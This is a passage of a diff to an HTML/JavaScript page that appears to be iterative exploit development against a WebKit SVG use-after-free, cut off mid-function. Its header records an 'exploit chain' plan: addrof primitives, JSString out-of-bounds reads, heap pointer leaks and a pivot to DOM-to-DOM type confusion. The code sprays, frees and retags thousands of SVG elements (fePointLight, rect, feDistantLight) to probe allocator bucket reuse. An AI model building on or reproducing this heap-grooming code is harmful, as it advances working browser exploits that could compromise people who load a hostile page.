@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v38</title>
+<title>SVG UAF v39</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -34,52 +34,50 @@ button:disabled{opacity:.3}
 .badge-warn{background:#221100;color:#ffcc00;border:1px solid #443300}
 .badge-fail{background:#220000;color:#ff4141;border:1px solid #440000}
 .badge-info{background:#111;color:#666;border:1px solid #222}
-.summary-divider{margin:10px 0;border-top:1px dashed #222}
 .summary-footer{font-size:10px;color:#555;padding-top:8px;line-height:1.8}
 .summary-footer .highlight{color:#ffcc00}
+.summary-divider{margin:10px 0;border-top:1px dashed #222}
 </style>
 </head>
 <body>
-<h2>SVG UAF v38 — hueRotate spray + wasm addrof + memory pressure + JSString OOB + sRGB fix</h2>
+<h2>SVG UAF v39 — DOM-to-DOM type confusion: SVGLength / SVGPoint / SVGRect / CSSValue bucket probe</h2>
 <div class="sub">
-  v37 findings:
-  - GRM: 0 hits even at N=4096 (81,920 SVGNumbers). bmalloc IsoHeap NEVER scavenges unless entire page freed simultaneously.
-    slot[0]=1 (identity default) — proof: freed slots are in the free list but NEVER reused while memory is healthy.
-    Cross-type: feFuncR and feColorMatrix are in DIFFERENT IsoHeap buckets (different C++ types → different IsoAllocator).
-  - KM81: 81/81 hit. order=16: 256 slots. kernelMatrix UAF = 256-slot float32 primitive.
-  - F64: CONFIRMED float32 on BOTH feColorMatrix AND feConvolveMatrix. No float64 path via SVG.
-    16777217 → 16777216 (float32 rounds down). ALL SVG animated numbers are float.
-  - TCF: 0 corruption hits. Expected — groom must work first.
-  - MCO2: formula mismatch — exp was wrong. sRGB gamma applies to the OFFSET too: pixel = encode_sRGB(offset) * 255.
-    real formula: R_px = round(encode_sRGB(slot[4]) * 255) when src=0. FIXED in this build.
+  v38 KEY FINDING: DOM heap (bmalloc::IsoHeap) and JS heap (JSC::MarkedSpace) are SEPARATE allocators.
+  SVGNumber freed slots NEVER overlap with JSString, ArrayBuffer, Float64Array, or wasm.Memory.
+  Root cause of all Stage 1/2 failures confirmed.
 
-  v38 targets:
-  1. GRM3: hueRotate spray (1 SVGNumber each, not 20). Pack the IsoHeap bucket faster.
-     Also: memory pressure trigger (giant ArrayBuffer) before checking reuse.
-     Also: check if SVGAnimatedNumber (hueRotate) is SAME IsoHeap bucket as SVGNumber (matrix values).
-  2. WAS: WebAssembly.Memory addrof probe — allocate wasm.Memory after UAF, check if it lands in freed SVGNumber slot.
-  3. STR: JSString length confusion — corrupt string length field via float32 UAF → OOB string read.
-  4. SZE: SVGNumber sizeof — infer actual object size from groom behavior.
-  5. MCO3: offset oracle with corrected sRGB formula.
-  6. PTR: pointer range oracle — use offset oracle to leak heap pointer nibbles.
+  PIVOT: DOM-to-DOM type confusion.
+  Same IsoHeap? → SVGLength, SVGPoint, SVGRect, SVGMatrix entries, SVGNumberOptionalNumber, CSSPrimitiveValue.
+  sizeof(SVGNumber) = 4 bytes data + vtable ptr overhead. IsoHeap size class likely 8 or 16.
+
+  v39 targets:
+  1. DOM1: SVGLength bucket probe — feGaussianBlur.stdDeviationX, feMorphology.radiusX
+  2. DOM2: SVGPoint bucket probe — feTurbulence.baseFrequencyX
+  3. DOM3: SVGNumberOptionalNumber — feGaussianBlur.stdDeviation has TWO numbers
+  4. DOM4: sizeof(SVGNumber) definitive — probe IsoHeap size class via allocation patterns
+  5. DOM5: vtable corruption detection — if wrong DOM type lands in freed slot, accessing it should behave wrong
+  6. DOM6: SVGAnimatedNumber (hueRotate angle) vs SVGNumber (matrix value) — same class? re-probe with getAttribute oracle
+  7. PTR2: float32 ULP probe — write 4GB+1, 4GB+2, etc. to find actual precision boundary
+  8. SIZ2: IsoHeap page size probe via controlled OOM pattern
 </div>
 <div id="controls">
-  <button onclick="runGRM3()">GRM3 hueRotate-spray</button>
-  <button onclick="runWAS()">WAS wasm-addrof</button>
-  <button onclick="runSTR()">STR string-oob</button>
-  <button onclick="runSZE()">SZE sizeof-probe</button>
-  <button onclick="runMCO3()">MCO3 oracle-fix</button>
-  <button onclick="runPTR()">PTR ptr-range</button>
+  <button onclick="runDOM1()">DOM1 SVGLength</button>
+  <button onclick="runDOM2()">DOM2 SVGPoint</button>
+  <button onclick="runDOM3()">DOM3 SVGOptNum</button>
+  <button onclick="runDOM4()">DOM4 sizeof</button>
+  <button onclick="runDOM5()">DOM5 vtable</button>
+  <button onclick="runDOM6()">DOM6 AnimNum</button>
+  <button onclick="runPTR2()">PTR2 ULP</button>
+  <button onclick="runSIZ2()">SIZ2 page</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearAll()">CLR</button>
 </div>
 <div id="log"></div>
 <div id="summary-panel">
-  <div id="summary-header">⚡ SESSION SUMMARY — EXPLOIT CHAIN STATUS</div>
+  <div id="summary-header">⚡ SESSION SUMMARY — EXPLOIT CHAIN STATUS v39</div>
   <div id="summary-body"></div>
 </div>
-
 <script>
 var SVG_NS = 'http://www.w3.org/2000/svg';
 var Lel = document.getElementById('log');
@@ -87,1119 +85,998 @@ var SPanel = document.getElementById('summary-panel');
 var SBody = document.getElementById('summary-body');
 
 var R = {
-  grm3_hits: 0, grm3_min_n: null, grm3_pressure_helped: false,
-  grm3_same_bucket: false,
-  was_hit: false, was_ab_hit: false, was_ptr_leaked: null,
-  str_len_corrupted: false, str_oob_bytes: null,
-  sze_sizeof: null,
-  mco3_ok: false, mco3_formula_ok: false,
-  ptr_nibbles: [],
-  // prior confirmed
+  dom1_svglen_hit: false, dom1_svglen_type: null,
+  dom2_svgpoint_hit: false,
+  dom3_svgoptnum_hit: false,
+  dom4_sizeof: null, dom4_size_class: null,
+  dom5_vtable_corrupt: false, dom5_call_redirected: false,
+  dom6_animnum_same_bucket: false,
+  ptr2_ulp_4g: null, ptr2_exact_limit: null,
+  siz2_page_bytes: null,
+  // confirmed from prior builds
   uaf_confirmed: true, oracle_confirmed: true, srgb_confirmed: true,
-  km81_ok: true, km256_ok: true, all_float32: true,
+  km256_ok: true, all_float32: true, dom_js_separate: true,
 };
 
-function log(m, c) {
-  var s = document.createElement('span');
-  if (c) s.className = c;
-  s.textContent = m + '\n';
-  Lel.appendChild(s);
-  Lel.scrollTop = Lel.scrollHeight;
-}
-function sep() { log('----------------------------------------------------', 'sep'); }
-function raf() { return new Promise(function(r){ requestAnimationFrame(r); }); }
-function sleep(ms) { return new Promise(function(r){ setTimeout(r, ms); }); }
-function copyLog() {
-  var txt = Lel.innerText + '\n' + (SBody.innerText || '');
-  try { navigator.clipboard.writeText(txt); } catch(e) {
-    var a = document.createElement('textarea'); a.value = txt;
-    document.body.appendChild(a); a.select(); document.execCommand('copy'); a.remove();
-  }
-}
-function clearAll() { Lel.innerHTML = ''; SPanel.classList.remove('visible'); SBody.innerHTML = ''; }
-function dis(d) {
-  var btns = document.querySelectorAll('button');
-  for (var i = 0; i < btns.length; i++) {
-    var fn = btns[i].getAttribute('onclick') || '';
-    if (fn.indexOf('copy') === -1 && fn.indexOf('clear') === -1) btns[i].disabled = d;
-  }
-}
-window.onerror = function(m,u,l,c,e){ log('[CRASH] '+m+' L'+l,'bad'); return false; };
+function log(m,c){var s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';Lel.appendChild(s);Lel.scrollTop=Lel.scrollHeight;}
+function sep(){log('----------------------------------------------------','sep');}
+function raf(){return new Promise(function(r){requestAnimationFrame(r);});}
+function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
+function copyLog(){var t=Lel.innerText+'\n'+(SBody.innerText||'');try{navigator.clipboard.writeText(t);}catch(e){var a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove();}}
+function clearAll(){Lel.innerHTML='';SPanel.classList.remove('visible');SBody.innerHTML='';}
+function dis(d){var b=document.querySelectorAll('button');for(var i=0;i<b.length;i++){var f=b[i].getAttribute('onclick')||'';if(f.indexOf('copy')===-1&&f.indexOf('clear')===-1)b[i].disabled=d;}}
+window.onerror=function(m,u,l){log('[CRASH] '+m+' L'+l,'bad');return false;};
 
-function identity20() { return [1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0]; }
+function identity20(){return[1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0];}
 
-function makeFCM(vals, fid) {
-  fid = fid || ('f'+Math.random().toString(36).slice(2,8));
-  var svg = document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','1'); svg.setAttribute('height','1');
+function makeFCM(vals,fid){
+  fid=fid||('f'+Math.random().toString(36).slice(2,8));
+  var svg=document.createElementNS(SVG_NS,'svg');
+  svg.setAttribute('width','1');svg.setAttribute('height','1');
   svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
   var defs=document.createElementNS(SVG_NS,'defs');
-  var filt=document.createElementNS(SVG_NS,'filter'); filt.setAttribute('id',fid);
+  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id',fid);
   var fcm=document.createElementNS(SVG_NS,'feColorMatrix');
   fcm.setAttribute('type','matrix');
   fcm.setAttribute('values',(vals||identity20()).join(' '));
-  filt.appendChild(fcm); defs.appendChild(filt); svg.appendChild(defs);
+  filt.appendChild(fcm);defs.appendChild(filt);svg.appendChild(defs);
   document.body.appendChild(svg);
-  return {svg:svg,fcm:fcm,filter:filt,fid:fid};
+  return{svg:svg,fcm:fcm,filter:filt,fid:fid};
 }
 
-// Make a hueRotate feColorMatrix (1 SVGNumber, different IsoHeap class than matrix)
-function makeHR(angle, fid) {
-  fid = fid || ('hr'+Math.random().toString(36).slice(2,8));
-  var svg = document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','1'); svg.setAttribute('height','1');
+function cleanupD(d){if(d&&d.svg&&d.svg.parentNode)d.svg.parentNode.removeChild(d.svg);}
+
+// Make feGaussianBlur — stdDeviation is SVGAnimatedNumber (single) or SVGAnimatedNumberOptionalNumber (two)
+function makeGaussian(std, fid) {
+  fid=fid||('gb'+Math.random().toString(36).slice(2,8));
+  var svg=document.createElementNS(SVG_NS,'svg');
+  svg.setAttribute('width','1');svg.setAttribute('height','1');
   svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
   var defs=document.createElementNS(SVG_NS,'defs');
-  var filt=document.createElementNS(SVG_NS,'filter'); filt.setAttribute('id',fid);
-  var fcm=document.createElementNS(SVG_NS,'feColorMatrix');
-  fcm.setAttribute('type','hueRotate');
-  fcm.setAttribute('values',String(angle||45));
-  filt.appendChild(fcm); defs.appendChild(filt); svg.appendChild(defs);
+  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id',fid);
+  var fgb=document.createElementNS(SVG_NS,'feGaussianBlur');
+  fgb.setAttribute('stdDeviation',String(std||2));
+  filt.appendChild(fgb);defs.appendChild(filt);svg.appendChild(defs);
   document.body.appendChild(svg);
-  return {svg:svg,fcm:fcm,filter:filt,fid:fid};
+  return{svg:svg,fgb:fgb,filter:filt,fid:fid};
 }
 
-// Make a saturate feColorMatrix (1 SVGNumber, possibly different type)
-function makeSAT(v, fid) {
-  fid = fid || ('sat'+Math.random().toString(36).slice(2,8));
-  var svg = document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','1'); svg.setAttribute('height','1');
+// Make feMorphology — radius is SVGAnimatedNumberOptionalNumber
+function makeMorph(rx, ry, fid) {
+  fid=fid||('mo'+Math.random().toString(36).slice(2,8));
+  var svg=document.createElementNS(SVG_NS,'svg');
+  svg.setAttribute('width','1');svg.setAttribute('height','1');
   svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
   var defs=document.createElementNS(SVG_NS,'defs');
-  var filt=document.createElementNS(SVG_NS,'filter'); filt.setAttribute('id',fid);
-  var fcm=document.createElementNS(SVG_NS,'feColorMatrix');
-  fcm.setAttribute('type','saturate');
-  fcm.setAttribute('values',String(v||0.5));
-  filt.appendChild(fcm); defs.appendChild(filt); svg.appendChild(defs);
+  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id',fid);
+  var fmo=document.createElementNS(SVG_NS,'feMorphology');
+  fmo.setAttribute('operator','erode');
+  fmo.setAttribute('radius',rx+(ry!==undefined?' '+ry:''));
+  filt.appendChild(fmo);defs.appendChild(filt);svg.appendChild(defs);
   document.body.appendChild(svg);
-  return {svg:svg,fcm:fcm,filter:filt,fid:fid};
+  return{svg:svg,fmo:fmo,filter:filt,fid:fid};
 }
 
-function cleanupD(d){
-  if(d&&d.svg&&d.svg.parentNode) d.svg.parentNode.removeChild(d.svg);
+// Make feTurbulence — baseFrequency is SVGAnimatedNumberOptionalNumber
+function makeTurb(bfx, bfy, fid) {
+  fid=fid||('tb'+Math.random().toString(36).slice(2,8));
+  var svg=document.createElementNS(SVG_NS,'svg');
+  svg.setAttribute('width','1');svg.setAttribute('height','1');
+  svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+  var defs=document.createElementNS(SVG_NS,'defs');
+  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id',fid);
+  var ftb=document.createElementNS(SVG_NS,'feTurbulence');
+  ftb.setAttribute('type','turbulence');
+  ftb.setAttribute('baseFrequency',bfx+(bfy!==undefined?' '+bfy:''));
+  filt.appendChild(ftb);defs.appendChild(filt);svg.appendChild(defs);
+  document.body.appendChild(svg);
+  return{svg:svg,ftb:ftb,filter:filt,fid:fid};
 }
 
-function f32bitsLE(n){
-  var buf=new ArrayBuffer(4);
-  new Float32Array(buf)[0]=n;
-  return new DataView(buf).getUint32(0,true);
-}
-
-var _cnv=null,_ctx=null;
-function getCanvas(){
-  if(!_cnv){_cnv=document.createElement('canvas');_cnv.width=300;_cnv.height=300;_ctx=_cnv.getContext('2d');}
-  return{cnv:_cnv,ctx:_ctx};
-}
-async function svgPixel(svgStr,x,y){
-  x=x||150; y=y||150;
-  var blob=new Blob([svgStr],{type:'image/svg+xml'});
-  var url=URL.createObjectURL(blob);
-  var img=new Image();
-  var result=await new Promise(function(resolve){
-    img.onload=function(){
-      try{var cc=getCanvas();cc.ctx.clearRect(0,0,300,300);cc.ctx.drawImage(img,0,0);
-        var p=cc.ctx.getImageData(x,y,1,1);resolve([p.data[0],p.data[1],p.data[2],p.data[3]]);}
-      catch(e){resolve(null);}
-    };
-    img.onerror=function(){resolve(null);};
-    img.src=url;
-    setTimeout(function(){resolve(null);},3000);
-  });
-  URL.revokeObjectURL(url);
-  return result;
-}
-
-// CORRECTED sRGB formula:
-// WebKit always runs: out_linear = feColorMatrix(decode_sRGB(src/255))
-// then: R_px = round(encode_sRGB(out_linear) * 255)
-// For black source (src=0): out_linear = matrix[4] (the offset column)
-// R_px = round(encode_sRGB(matrix[4]) * 255)
-function encode_sRGB(v) {
-  v = Math.max(0, Math.min(1, v));
-  if (v <= 0.0031308) return 12.92 * v;
-  return 1.055 * Math.pow(v, 1.0/2.4) - 0.055;
-}
-function decode_sRGB(v) {
-  v = Math.max(0, Math.min(1, v));
-  if (v <= 0.04045) return v / 12.92;
-  return Math.pow((v + 0.055) / 1.055, 2.4);
-}
-function offsetToPixel(offset) {
-  return Math.round(encode_sRGB(offset) * 255);
+// Make SVGSVGElement with a point list (SVGPoint)
+function makeSVGWithPoint(fid) {
+  fid=fid||('pt'+Math.random().toString(36).slice(2,8));
+  var svg=document.createElementNS(SVG_NS,'svg');
+  svg.setAttribute('width','100');svg.setAttribute('height','100');
+  svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+  var poly=document.createElementNS(SVG_NS,'polyline');
+  poly.setAttribute('points','10,10 20,20 30,10');
+  svg.appendChild(poly);
+  document.body.appendChild(svg);
+  return{svg:svg,poly:poly,fid:fid};
 }
 
 /*
- * GRM3: hueRotate spray
+ * DOM1: SVGLength bucket probe
  *
- * KEY INSIGHT from v37: feColorMatrix(matrix) has 20 SVGNumbers BUT
- * the SVGAnimatedNumber used by hueRotate/saturate is a DIFFERENT C++ class.
- * WebKit source:
- *   feColorMatrix.values (matrix type) → SVGAnimatedNumberList → SVGNumber per element
- *   feColorMatrix.values (hueRotate type) → SVGAnimatedNumber → single float m_value
+ * SVGLength is the C++ class backing SVGAnimatedLength::baseVal.
+ * It stores a float (the length value) and a unit type (uint8).
+ * sizeof(SVGLength) is likely 8 or 12 bytes.
+ * If it's in the same IsoHeap size class as SVGNumber (4-byte float), they share a bucket.
  *
- * These are DIFFERENT IsoHeap buckets because they're different C++ types:
- *   SVGNumber       → one bucket
- *   SVGAnimatedNumber → another bucket (or maybe it directly allocates the float)
+ * Test: spray SVGLength objects via fePointLight x/y/z attributes (all SVGAnimatedLength).
+ * Free them. Then alloc SVGNumber (matrix feColorMatrix). Check if slot[0] ≠ default.
  *
- * But: does freeing 16K hueRotate elements (16K SVGAnimatedNumber allocs)
- * let a MATRIX feColorMatrix (SVGNumber alloc) land on one?
- * TEST: spray hueRotate, free all, alloc matrix feColorMatrix.
+ * Also: feSpotLight, fePointLight, feDistantLight have SVGAnimatedLength attributes.
+ * path.pathLength is also SVGAnimatedLength.
  *
- * Also: memory pressure technique.
- * Force bmalloc scavenging by allocating huge array then releasing.
- * bmalloc::Scavenger wakes up and returns free pages to OS.
- * After scavenge: IsoHeap free pages ARE returned to the heap.
- *
- * Also: probe whether a new feColorMatrix(matrix) element reuses
- * freed hueRotate slots — if yes: CROSS-BUCKET GROOM possible.
+ * Objects we probe (all SVGAnimatedLength → baseVal is SVGLength):
+ *   fePointLight.x, .y, .z
+ *   feSpotLight.x, .y, .z, .pointsAtX, .pointsAtY, .pointsAtZ
+ *   feDistantLight.azimuth, .elevation (SVGAnimatedNumber, not length!)
+ *   SVGRectElement.x, .y, .width, .height (SVGAnimatedLength)
+ *   SVGCircleElement.cx, .cy, .r (SVGAnimatedLength)
  */
-async function runGRM3(q) {
-  if (!q) { dis(true); sep(); log('GRM3: hueRotate spray + memory pressure groom', 'inf'); sep(); }
+async function runDOM1(q) {
+  if(!q){dis(true);sep();log('DOM1: SVGLength bucket probe','inf');sep();}
 
-  var TAG = 99887.76543;
-  var TAG2 = 54321.12345;
+  var TAG = 7654321.0;
 
-  // Test A: pure hueRotate spray (1 SVGAnimatedNumber each)
-  // Does freeing 16K hueRotate elements let a new hueRotate land on freed slot?
-  log('  TestA: hueRotate self-reuse (1 SVGAnimatedNumber each)', 'inf');
+  // TestA: fePointLight SVGAnimatedLength spray → free → alloc SVGNumber
+  log('  TestA: fePointLight x/y/z (SVGAnimatedLength) → free → feColorMatrix(matrix)','inf');
   {
-    var sizes = [1000, 2000, 4000, 8000, 16000];
-    for (var si = 0; si < sizes.length; si++) {
-      var N = sizes[si];
-      var ds = [];
-      for (var i = 0; i < N; i++) ds.push(makeHR(i % 360));
-      await raf(); await raf();
-      // Tag last element
-      var lastList = ds[N-1].fcm.values;
-      var saved_last = lastList;
-      ds[N-1].fcm.remove(); await raf();
-      try { saved_last.baseVal[0].value = TAG; } catch(e){}
-      ds[N-1].filter.appendChild(ds[N-1].fcm); await raf();
-      // Free all
-      for (var i = N-1; i >= 0; i--) cleanupD(ds[i]);
-      ds = null;
-      await raf(); await raf();
-      // Alloc new hueRotate
-      var dT = makeHR(90);
-      await raf();
-      var tSlot = null;
-      try { tSlot = dT.fcm.values.baseVal[0].value; } catch(e){}
-      var hit = typeof tSlot === 'number' && Math.abs(tSlot - TAG) < 1;
-      if (hit) { R.grm3_hits++; R.grm3_min_n = N; }
-      log('  hueRotate N=' + N + ' slot[0]=' + tSlot + (hit ? ' ← HIT! IsoHeap reused' : ' (no hit)'),
-          hit ? 'win' : 'inf');
-      cleanupD(dT);
-      if (hit) break;
+    var N=4096;
+    var items=[];
+    for(var i=0;i<N;i++){
+      var svg=document.createElementNS(SVG_NS,'svg');
+      svg.setAttribute('width','1');svg.setAttribute('height','1');
+      svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+      var defs=document.createElementNS(SVG_NS,'defs');
+      var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','pl'+i);
+      var fpl=document.createElementNS(SVG_NS,'fePointLight');
+      fpl.setAttribute('x',String(i));fpl.setAttribute('y',String(i));fpl.setAttribute('z','100');
+      filt.appendChild(fpl);defs.appendChild(filt);svg.appendChild(defs);
+      document.body.appendChild(svg);
+      items.push({svg:svg,fpl:fpl});
     }
+    await raf();await raf();
+    // Tag the last fePointLight's x baseVal
+    var savedPL=items[N-1].fpl.x;
+    items[N-1].svg.parentNode.removeChild(items[N-1].svg); // removes from DOM → frees SVGLength
+    await raf();
+    try{savedPL.baseVal.value=TAG;}catch(e){}
+    // Free all
+    for(var i=N-2;i>=0;i--){if(items[i].svg.parentNode)items[i].svg.parentNode.removeChild(items[i].svg);}
+    items=null;await raf();await raf();
+    // Alloc SVGNumber (feColorMatrix matrix)
+    var dT=makeFCM(identity20());await raf();
+    var tSlot=null;try{tSlot=dT.fcm.values.baseVal[0].value;}catch(e){}
+    var hit=typeof tSlot==='number'&&Math.abs(tSlot-TAG)<1;
+    R.dom1_svglen_hit=hit;
+    log('  fePointLight→matrix slot[0]='+tSlot+(hit?' ← HIT! SVGLength same bucket as SVGNumber!':' (no hit)')
+      ,hit?'win':'inf');
+    cleanupD(dT);
   }
 
-  // Test B: hueRotate spray → free → alloc MATRIX feColorMatrix (cross-class probe)
-  log('  TestB: hueRotate freed → matrix feColorMatrix alloc (cross-class)', 'inf');
+  // TestB: SVGRectElement width/height (SVGAnimatedLength) → free → feColorMatrix
+  log('  TestB: SVGRectElement x/y/width/height (SVGAnimatedLength) → free → matrix','inf');
   {
-    var N2 = 16000;
-    var ds2 = [];
-    for (var i = 0; i < N2; i++) ds2.push(makeHR(i % 360));
-    await raf(); await raf();
-    var saved2 = ds2[N2-1].fcm.values;
-    ds2[N2-1].fcm.remove(); await raf();
-    try { saved2.baseVal[0].value = TAG; } catch(e){}
-    ds2[N2-1].filter.appendChild(ds2[N2-1].fcm); await raf();
-    for (var i = N2-1; i >= 0; i--) cleanupD(ds2[i]);
-    ds2 = null;
-    await raf(); await raf();
-    var dTb = makeFCM(identity20());
+    var N2=4096;
+    var rects=[];
+    for(var i=0;i<N2;i++){
+      var svg2=document.createElementNS(SVG_NS,'svg');
+      svg2.setAttribute('width','1');svg2.setAttribute('height','1');
+      svg2.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+      var rect=document.createElementNS(SVG_NS,'rect');
+      rect.setAttribute('x',String(i));rect.setAttribute('y',String(i));
+      rect.setAttribute('width','10');rect.setAttribute('height','10');
+      svg2.appendChild(rect);document.body.appendChild(svg2);
+      rects.push({svg:svg2,rect:rect});
+    }
+    await raf();await raf();
+    var savedW=rects[N2-1].rect.width;
+    rects[N2-1].svg.parentNode.removeChild(rects[N2-1].svg);
     await raf();
-    var tbSlot = null;
-    try { tbSlot = dTb.fcm.values.baseVal[0].value; } catch(e){}
-    var hitB = typeof tbSlot === 'number' && Math.abs(tbSlot - TAG) < 1;
-    R.grm3_same_bucket = hitB;
-    log('  cross-class: hueRotate→matrix slot[0]=' + tbSlot +
-        (hitB ? ' ← CROSS-CLASS HIT! same IsoHeap bucket!' : ' (different bucket, as expected)'),
-        hitB ? 'win' : 'inf');
+    try{savedW.baseVal.value=TAG;}catch(e){}
+    for(var i=N2-2;i>=0;i--){if(rects[i].svg.parentNode)rects[i].svg.parentNode.removeChild(rects[i].svg);}
+    rects=null;await raf();await raf();
+    var dTb=makeFCM(identity20());await raf();
+    var tbSlot=null;try{tbSlot=dTb.fcm.values.baseVal[0].value;}catch(e){}
+    var hitB=typeof tbSlot==='number'&&Math.abs(tbSlot-TAG)<1;
+    if(hitB){R.dom1_svglen_hit=true;R.dom1_svglen_type='SVGRectElement.width';}
+    log('  SVGRectElement→matrix slot[0]='+tbSlot+(hitB?' ← HIT!':' (no hit)'),hitB?'win':'inf');
     cleanupD(dTb);
   }
 
-  // Test C: memory pressure technique
-  // Alloc 128MB ArrayBuffer → force scavenging → then check if SVGNumber slots now reusable
-  log('  TestC: memory pressure before groom (128MB alloc + free)', 'inf');
+  // TestC: reverse — SVGNumber free → alloc SVGLength → check if SVGLength gets our tag
+  log('  TestC: SVGNumber freed → alloc SVGRectElement (reverse probe)','inf');
   {
-    var N3 = 2048;
-    var ds3 = [];
-    for (var i = 0; i < N3; i++) ds3.push(makeFCM(identity20()));
-    await raf(); await raf();
-    try { ds3[N3-1].fcm.values.baseVal[0].value = TAG2; } catch(e){}
-    for (var i = N3-1; i >= 0; i--) cleanupD(ds3[i]);
-    ds3 = null;
-    await raf();
-    // Allocate pressure buffer
-    var pressureSize = 128 * 1024 * 1024; // 128MB
-    var pressureBuf = null;
-    try {
-      pressureBuf = new ArrayBuffer(pressureSize);
-      // Touch it to force commit
-      var view = new Uint8Array(pressureBuf);
-      for (var i = 0; i < pressureSize; i += 4096) view[i] = 1;
-      log('  128MB ArrayBuffer allocated, touching pages...', 'dim');
-    } catch(e) {
-      log('  pressure alloc failed: ' + e.message + ' (trying 64MB)', 'inf');
-      try {
-        pressureBuf = new ArrayBuffer(64 * 1024 * 1024);
-        var view = new Uint8Array(pressureBuf);
-        for (var i = 0; i < 64*1024*1024; i += 4096) view[i] = 1;
-      } catch(e2) {
-        log('  64MB also failed: ' + e2.message, 'bad');
-      }
-    }
-    // Release it — force scavenger to run
-    pressureBuf = null;
-    await raf(); await raf(); await sleep(50); await raf(); await raf();
-    // Now try allocation
-    var dTc = makeFCM(identity20());
-    await raf();
-    var tcSlot = null;
-    try { tcSlot = dTc.fcm.values.baseVal[0].value; } catch(e){}
-    var hitC = typeof tcSlot === 'number' && Math.abs(tcSlot - TAG2) < 1;
-    R.grm3_pressure_helped = hitC;
-    log('  post-pressure slot[0]=' + tcSlot + (hitC ? ' ← HIT! pressure works!' : ' (no hit)'),
-        hitC ? 'win' : 'inf');
-    cleanupD(dTc);
+    var N3=4096;
+    var ds3=[];
+    for(var i=0;i<N3;i++)ds3.push(makeFCM(identity20()));
+    await raf();await raf();
+    try{ds3[N3-1].fcm.values.baseVal[0].value=TAG;}catch(e){}
+    for(var i=N3-1;i>=0;i--)cleanupD(ds3[i]);
+    ds3=null;await raf();await raf();
+    // Alloc SVGRectElement
+    var svg3=document.createElementNS(SVG_NS,'svg');svg3.setAttribute('width','1');svg3.setAttribute('height','1');
+    svg3.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+    var rect3=document.createElementNS(SVG_NS,'rect');
+    rect3.setAttribute('x','1');rect3.setAttribute('y','1');rect3.setAttribute('width','5');rect3.setAttribute('height','5');
+    svg3.appendChild(rect3);document.body.appendChild(svg3);await raf();
+    var xVal=null;try{xVal=rect3.x.baseVal.value;}catch(e){}
+    var hitC=typeof xVal==='number'&&Math.abs(xVal-TAG)<1;
+    log('  reverse SVGNumber→SVGRectElement x.baseVal='+xVal+(hitC?' ← HIT!':' (no hit)'),hitC?'win':'inf');
+    if(svg3.parentNode)svg3.parentNode.removeChild(svg3);
   }
 
-  // Test D: spray matrix, free, allocate hueRotate (reverse cross-class)
-  log('  TestD: matrix freed → hueRotate alloc (reverse cross-class)', 'inf');
+  // TestD: feDistantLight azimuth/elevation (SVGAnimatedNumber not SVGAnimatedLength)
+  log('  TestD: feDistantLight azimuth/elevation (SVGAnimatedNumber) — same as matrix SVGNumber?','inf');
   {
-    var N4 = 4096;
-    var ds4 = [];
-    for (var i = 0; i < N4; i++) ds4.push(makeFCM(identity20()));
-    await raf(); await raf();
-    try { ds4[N4-1].fcm.values.baseVal[0].value = TAG; } catch(e){}
-    for (var i = N4-1; i >= 0; i--) cleanupD(ds4[i]);
-    ds4 = null;
-    await raf(); await raf();
-    var dTd = makeHR(90);
+    var N4=4096;
+    var lights=[];
+    for(var i=0;i<N4;i++){
+      var svg4=document.createElementNS(SVG_NS,'svg');svg4.setAttribute('width','1');svg4.setAttribute('height','1');
+      svg4.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+      var defs4=document.createElementNS(SVG_NS,'defs');var filt4=document.createElementNS(SVG_NS,'filter');filt4.setAttribute('id','dl'+i);
+      var fdl=document.createElementNS(SVG_NS,'feDistantLight');
+      fdl.setAttribute('azimuth',String(i%360));fdl.setAttribute('elevation','45');
+      filt4.appendChild(fdl);defs4.appendChild(filt4);svg4.appendChild(defs4);document.body.appendChild(svg4);
+      lights.push({svg:svg4,fdl:fdl});
+    }
+    await raf();await raf();
+    var savedAz=lights[N4-1].fdl.azimuth;
+    lights[N4-1].svg.parentNode.removeChild(lights[N4-1].svg);
     await raf();
-    var tdSlot = null;
-    try { tdSlot = dTd.fcm.values.baseVal[0].value; } catch(e){}
-    var hitD = typeof tdSlot === 'number' && Math.abs(tdSlot - TAG) < 1;
-    log('  reverse: matrix→hueRotate slot[0]=' + tdSlot + (hitD ? ' ← HIT!' : ' (no hit)'), hitD ? 'win' : 'inf');
+    try{savedAz.baseVal=TAG;}catch(e){}
+    for(var i=N4-2;i>=0;i--){if(lights[i].svg.parentNode)lights[i].svg.parentNode.removeChild(lights[i].svg);}
+    lights=null;await raf();await raf();
+    var dTd=makeFCM(identity20());await raf();
+    var tdSlot=null;try{tdSlot=dTd.fcm.values.baseVal[0].value;}catch(e){}
+    var hitD=typeof tdSlot==='number'&&Math.abs(tdSlot-TAG)<1;
+    log('  feDistantLight→matrix slot[0]='+tdSlot+(hitD?' ← HIT! SVGAnimatedNumber same bucket!':' (no hit)'),hitD?'win':'inf');
